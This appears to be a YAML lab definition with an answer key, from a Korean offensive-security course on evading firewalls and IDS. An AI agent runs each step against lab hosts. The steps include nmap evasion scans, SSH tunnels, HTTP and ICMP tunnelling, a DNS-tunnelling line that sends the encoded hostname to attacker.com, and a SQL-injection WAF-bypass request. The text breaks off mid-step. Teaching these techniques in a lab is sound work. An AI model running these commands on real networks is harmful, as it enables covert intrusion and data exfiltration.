lab_id: attack-adv-ai-week03
title: 네트워크 우회 기법 (AI 지원)
version: ai
course: attack-adv-ai
week: 3
description: 방화벽, IDS/IPS를 우회하는 다양한 네트워크 기법을 실습한다. 패킷 조작, 터널링, 프로토콜 남용 등을 통해 보안 장비의
  탐지를 회피하는 고급 기법을 다룬다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- nmap 방화벽 우회 옵션을 활용하여 필터링된 포트를 탐지한다
- SSH 터널링과 포트 포워딩을 통한 접근 통제 우회를 수행한다
- 패킷 분할, 디코이 등 IDS 회피 기법을 적용한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: nmap의 ACK 스캔(-sA)을 사용하여 10.20.30.1의 방화벽 규칙을 매핑하라. 포트 22,80,443,8080에
    대해 필터링 상태를 확인하라.
  hint: -sA 스캔은 방화벽의 상태 추적(stateful) 여부를 판별한다
  category: recon
  points: 10
  answer: nmap -sA -p 22,80,443,8080 10.20.30.1
  answer_detail: ACK 스캔은 RST 응답 여부로 방화벽의 필터링 규칙을 매핑한다. unfiltered는 포트에 도달 가능(방화벽 허용),
    filtered는 차단됨을 의미한다. 상태 기반 방화벽은 ACK 패킷도 차단하지만, 무상태 방화벽은 통과시킨다. 이를 통해 방화벽 유형과 규칙을
    추정할 수 있다.
  verify:
    type: output_contains
    expect: filtered
    field: stdout
  target_vm: attacker
  script: nmap -sA -p 22,80,443,8080 10.20.30.1
  risk_level: low
  bastion_prompt: nmap의 ACK 스캔(-sA)을 사용하여 10.20.30.1의 방화벽 규칙을 매핑해줘
- order: 2
  instruction: nmap의 패킷 분할(-f) 옵션을 사용하여 IDS를 우회하면서 10.20.30.80의 포트 스캔을 수행하라. MTU를
    24로 설정하라.
  hint: --mtu 옵션으로 패킷 분할 크기를 지정한다
  category: exploit
  points: 10
  answer: nmap -f --mtu 24 -p 80,443,3000 10.20.30.80
  answer_detail: 패킷 분할(Fragmentation)은 IP 패킷을 작은 조각으로 나누어 IDS의 시그니처 매칭을 방해한다. 많은 IDS는
    분할된 패킷을 재조립하여 검사하지만, 비정상적인 MTU 크기나 중첩 분할은 재조립 로직의 취약점을 유발할 수 있다. --mtu 값은 8의 배수여야
    한다.
  verify:
    type: output_contains
    expect: open
    field: stdout
  target_vm: attacker
  script: nmap -f --mtu 24 -p 80,443,3000 10.20.30.80
  risk_level: medium
  bastion_prompt: nmap의 패킷 분할(-f) 옵션을 사용하여 IDS를 우회하면서 10.20.30.80의 포트 스캔을 수행하라. MTU를
    24로 설정해줘
- order: 3
  instruction: nmap의 디코이(-D) 옵션을 사용하여 소스 IP를 위장하면서 10.20.30.80을 스캔하라. 디코이 IP 3개를 포함하라.
  hint: -D decoy1,decoy2,ME 형태로 자신의 IP를 디코이 사이에 섞는다
  category: exploit
  points: 10
  answer: nmap -D 10.20.30.50,10.20.30.60,ME,10.20.30.70 -p 80,3000 10.20.30.80
  answer_detail: 디코이 스캔은 여러 가짜 소스 IP에서 동시에 스캔하는 것처럼 위장하여 실제 공격자의 IP를 식별하기 어렵게 만든다.
    ME는 실제 IP의 위치를 지정한다. 방어자 로그에는 디코이 IP들도 함께 기록되어 분석을 복잡하게 만든다. 단, 디코이 IP가 실제 존재하지
    않으면 SYN flood로 오탐될 수 있다.
  verify:
    type: output_contains
    expect: 10.20.30.80
    field: stdout
  target_vm: attacker
  script: nmap -D 10.20.30.50,10.20.30.60,ME,10.20.30.70 -p 80,3000 10.20.30.80
  risk_level: medium
  bastion_prompt: nmap의 디코이(-D) 옵션을 사용하여 소스 IP를 위장하면서 10.20.30.80을 스캔해줘
- order: 4
  instruction: SSH 로컬 포트 포워딩을 설정하여 방화벽 뒤의 서비스에 접근하는 시나리오를 구성하라. 로컬 포트 8888을 10.20.30.80:3000으로
    포워딩하는 명령을 작성하라(실행은 하지 않고 명령만 출력).
  hint: ssh -L 로컬포트:대상:대상포트 사용자@중간서버 형태이다
  category: exploit
  points: 10
  answer: echo 'ssh -L 8888:10.20.30.80:3000 -N -f ccc@10.20.30.1'
  answer_detail: SSH 로컬 포트 포워딩(-L)은 암호화된 SSH 터널을 통해 방화벽 뒤의 서비스에 접근하는 기법이다. 방화벽이 SSH(22번
    포트)만 허용하는 경우, 터널을 통해 내부의 임의 서비스에 접근할 수 있다. -N은 원격 명령 실행 없이 포워딩만, -f는 백그라운드 실행이다.
  verify:
    type: output_contains
    expect: ssh -L
    field: stdout
  target_vm: attacker
  script: echo 'ssh -L 8888:10.20.30.80:3000 -N -f ccc@10.20.30.1'
  risk_level: medium
  bastion_prompt: attacker VM에서 SSH 로컬 포트 포워딩을 설정하여 방화벽 뒤의 서비스에 접근하는 시나리오를 구성 작업을
    수행해줘
- order: 5
  instruction: SSH 동적 포트 포워딩(SOCKS 프록시)을 구성하는 명령을 작성하라. 로컬 포트 1080에서 SOCKS5 프록시를 생성하라.
  hint: ssh -D 포트번호 사용자@서버 형태이다
  category: exploit
  points: 10
  answer: echo 'ssh -D 1080 -N -f ccc@10.20.30.1 && curl --socks5 127.0.0.1:1080 http://10.20.30.80:3000'
  answer_detail: SSH 동적 포워딩(-D)은 SOCKS 프록시를 생성하여 모든 트래픽을 SSH 터널로 라우팅한다. 특정 포트가 아닌
    모든 대상에 접근할 수 있어 피봇팅(Pivoting)에 매우 유용하다. proxychains와 결합하면 nmap, curl 등 대부분의 도구를
    SOCKS 프록시를 통해 실행할 수 있다.
  verify:
    type: output_contains
    expect: ssh -D
    field: stdout
  target_vm: attacker
  script: echo 'ssh -D 1080 -N -f ccc@10.20.30.1 && curl --socks5 127.0.0.1:1080 http://10.20.30.80:3000'
  risk_level: medium
  bastion_prompt: attacker VM에서 curl로 SSH 동적 포트 포워딩(SOCKS 프록시)을 구성하는 명령 작업을 수행해줘
- order: 6
  instruction: nmap의 소스 포트 조작(--source-port) 옵션을 사용하여 DNS 소스 포트(53)에서 스캔을 수행하라. 일부
    방화벽이 DNS 응답을 허용하는 규칙을 악용하라.
  hint: --source-port 53 옵션으로 소스 포트를 53으로 설정한다
  category: exploit
  points: 10
  answer: nmap --source-port 53 -p 22,80,443 10.20.30.80
  answer_detail: 일부 방화벽은 DNS 응답 패킷(소스 포트 53)을 무조건 허용하는 잘못된 규칙을 가지고 있다. --source-port
    53으로 스캔하면 이러한 규칙을 우회할 수 있다. FTP(20), HTTP(80) 등 다른 잘 알려진 포트로도 시도할 수 있다. 현대 상태
    기반 방화벽에서는 효과가 제한적이다.
  verify:
    type: output_contains
    expect: open
    field: stdout
  target_vm: attacker
  script: nmap --source-port 53 -p 22,80,443 10.20.30.80
  risk_level: medium
  bastion_prompt: nmap의 소스 포트 조작(--source-port) 옵션을 사용하여 DNS 소스 포트(53)에서 스캔을 수행해줘
- order: 7
  instruction: ICMP 터널링의 원리를 이해하기 위해 ping 명령에 데이터를 포함하여 전송하라. 16바이트 패턴 데이터와 함께 10.20.30.80으로
    ICMP 패킷을 보내라.
  hint: ping -p 옵션으로 16진수 패딩 패턴을 지정할 수 있다
  category: exploit
  points: 10
  answer: ping -c 3 -p 4141414141414141 -s 64 10.20.30.80
  answer_detail: ICMP 터널링은 ICMP 패킷의 데이터 필드에 실제 전송하려는 데이터를 숨기는 기법이다. 대부분의 방화벽이 ICMP를
    허용하므로, 이를 통해 데이터 유출이나 C2 통신이 가능하다. icmpsh, ptunnel 등의 도구가 존재한다. 방어를 위해서는 ICMP
    페이로드 크기와 빈도를 모니터링해야 한다.
  verify:
    type: output_contains
    expect: bytes from
    field: stdout
  target_vm: attacker
  script: ping -c 3 -p 4141414141414141 -s 64 10.20.30.80
  risk_level: medium
  bastion_prompt: ICMP 터널링의 원리를 이해하기 위해 ping 명령에 데이터를 포함하여 전송해줘
- order: 8
  instruction: HTTP 터널링을 시뮬레이션하라. curl을 사용하여 POST 요청의 본문에 Base64 인코딩된 명령을 숨겨서 전송하라.
  hint: curl -X POST -d 옵션으로 데이터를 HTTP 본문에 포함한다
  category: exploit
  points: 10
  answer: 'CMD=$(echo ''whoami && hostname'' | base64) && curl -s -X POST -d "data=$CMD"
    http://10.20.30.80:3000/ -o /dev/null -w ''%{http_code}'' && echo '''' && echo
    "Encoded payload: $CMD"'
  answer_detail: HTTP 터널링은 정상적인 HTTP 트래픽 안에 비정상 데이터를 숨기는 기법이다. HTTPS를 사용하면 내용이 암호화되어
    DPI(Deep Packet Inspection)로도 탐지하기 어렵다. 실제 APT 그룹은 정상 웹 요청과 구별하기 어려운 패턴으로 C2 통신을
    구현한다.
  verify:
    type: output_contains
    expect: Encoded payload
    field: stdout
  target_vm: attacker
  script: 'CMD=$(echo ''whoami && hostname'' | base64) && curl -s -X POST -d "data=$CMD"
    http://10.20.30.80:3000/ -o /dev/null -w ''%{http_code}'' && echo '''' && echo
    "Encoded payload: $CMD"'
  risk_level: medium
  bastion_prompt: HTTP 터널링을 시뮬레이션하라. curl을 사용하여 POST 요청의 본문에 Base64 인코딩된 명령을 숨겨서 전송해줘
- order: 9
  instruction: nmap의 타이밍 옵션을 비교 분석하라. 10.20.30.80에 대해 T0(paranoid)부터 T4(aggressive)까지
    다른 속도로 포트 80을 스캔하고, 소요 시간을 비교하라.
  hint: time 명령으로 각 스캔의 소요 시간을 측정한다
  category: analysis
  points: 10
  answer: for t in 0 2 4; do echo "=== Timing T$t ==="; time nmap -T$t -p 80 10.20.30.80
    2>&1 | grep -E '(open|closed|filtered)'; echo '---'; done 2>&1
  answer_detail: nmap 타이밍 옵션은 스캔 속도와 탐지 회피 사이의 트레이드오프를 조절한다. T0(paranoid, 5분 간격)은
    가장 느리지만 IDS 탐지 확률이 낮고, T4(aggressive)는 빠르지만 IDS에 즉시 탐지된다. 실제 모의해킹에서는 환경에 따라 T1~T2를
    주로 사용한다.
  verify:
    type: output_contains
    expect: Timing
    field: stdout
  target_vm: attacker
  script: for t in 0 2 4; do echo "=== Timing T$t ==="; time nmap -T$t -p 80 10.20.30.80
    2>&1 | grep -E '(open|closed|filtered)'; echo '---'; done 2>&1
  risk_level: low
  bastion_prompt: nmap의 타이밍 옵션을 비교 분석하라. 10.20.30.80에 대해 T0(paranoid)부터 T4(aggressive)까지
    다른 속도로 포트 80을 스캔하고, 소요 시간을 비교해줘
- order: 10
  instruction: IPv6를 활용한 방화벽 우회를 시도하라. nmap으로 10.20.30.80에서 IPv6 주소를 탐지하고, IPv6 기반
    스캔을 수행하라.
  hint: nmap -6 옵션으로 IPv6 스캔을 수행한다. --script targets-ipv6-multicast-echo로 IPv6 호스트를
    탐지할 수 있다
  category: exploit
  points: 10
  answer: nmap --script targets-ipv6-multicast-echo --script-args newtargets -e eth0
    2>&1 | head -20
  answer_detail: 많은 방화벽 규칙이 IPv4에만 적용되어 IPv6 트래픽은 필터링되지 않는 경우가 있다. IPv6 멀티캐스트 핑(ff02::1)으로
    네트워크의 IPv6 활성 호스트를 탐지하고, IPv6 주소로 서비스에 접근하면 IPv4 기반 ACL을 우회할 수 있다. 이중 스택(Dual
    Stack) 환경에서 흔한 보안 맹점이다.
  verify:
    type: output_contains
    expect: nmap
    field: stdout
  target_vm: attacker
  script: nmap --script targets-ipv6-multicast-echo --script-args newtargets -e eth0
    2>&1 | head -20
  risk_level: medium
  bastion_prompt: IPv6를 활용한 방화벽 우회를 시도하라. nmap으로 10.20.30.80에서 IPv6 주소를 탐지하고, IPv6
    기반 스캔을 수행해줘
- order: 11
  instruction: DNS 터널링의 원리를 시뮬레이션하라. 명령 실행 결과를 Base64로 인코딩한 후, nslookup으로 DNS 쿼리에
    포함하여 전송하는 과정을 보여라.
  hint: 명령 결과를 base64로 인코딩하고, 서브도메인으로 사용하여 DNS 쿼리를 생성한다
  category: exploit
  points: 10
  answer: 'DATA=$(hostname | base64 | tr -d ''=\n'') && echo "DNS tunnel payload:
    $DATA.tunnel.attacker.com" && nslookup $DATA.tunnel.attacker.com 2>&1 | head -5'
  answer_detail: DNS 터널링은 데이터를 DNS 쿼리의 서브도메인으로 인코딩하여 전송하는 기법이다. 공격자는 권한 있는 DNS 서버를
    운영하여 쿼리를 수신하고 응답에 명령을 포함한다. 대부분의 방화벽이 DNS(53)를 허용하므로 은밀한 C2 채널로 활용된다. dnscat2,
    iodine 등의 도구가 있다.
  verify:
    type: output_contains
    expect: tunnel
    field: stdout
  target_vm: attacker
  script: 'DATA=$(hostname | base64 | tr -d ''=\n'') && echo "DNS tunnel payload:
    $DATA.tunnel.attacker.com" && nslookup $DATA.tunnel.attacker.com 2>&1 | head -5'
  risk_level: medium
  bastion_prompt: DNS 터널링의 원리를 시뮬레이션해줘
- order: 12
  instruction: iptables를 사용하여 소스 NAT(SNAT)로 패킷의 출발지 IP를 변조하는 규칙을 작성하라. 실행하지 않고 명령만
    출력하라.
  hint: iptables -t nat -A POSTROUTING 체인에서 SNAT을 설정한다
  category: exploit
  points: 10
  answer: echo 'iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 10.20.30.50'
    && echo 'iptables -t nat -A PREROUTING -i eth0 -j DNAT --to-destination 10.20.30.201'
  answer_detail: SNAT(Source NAT)를 이용한 IP 위조는 네트워크 레벨의 신원 은닉 기법이다. 공격자가 중간 호스트를 장악하면
    그 호스트의 IP로 트래픽을 전송하여 탐지를 회피할 수 있다. 이는 피봇팅과 결합하여 다단계 공격에서 추적을 어렵게 만든다.
  verify:
    type: output_contains
    expect: SNAT
    field: stdout
  target_vm: attacker
  script: echo 'iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 10.20.30.50'
    && echo 'iptables -t nat -A PREROUTING -i eth0 -j DNAT --to-destination 10.20.30.201'
  risk_level: medium
  bastion_prompt: attacker VM에서 iptables를 사용하여 소스 NAT(SNAT)로 패킷의 출발지 IP를 변조하는 규칙 작업을
    수행해줘
- order: 13
  instruction: WAF(Web Application Firewall) 우회를 시뮬레이션하라. curl을 사용하여 User-Agent를 변조하고,
    URL 인코딩을 활용하여 10.20.30.80:3000에 요청하라.
  hint: curl -A 옵션으로 User-Agent를 변경하고, URL 인코딩(%27 등)을 사용한다
  category: exploit
  points: 10
  answer: "curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1)' 'http://10.20.30.80:3000/rest/products/search?q=%27%20OR%201%3D1--'\
    \ \\\n  -o /dev/null \\\n  -w '%{http_code}'"
  answer_detail: WAF 우회 기법에는 User-Agent 위장(검색엔진 봇으로 위장), URL 이중 인코딩, 대소문자 변환(SeLeCt),
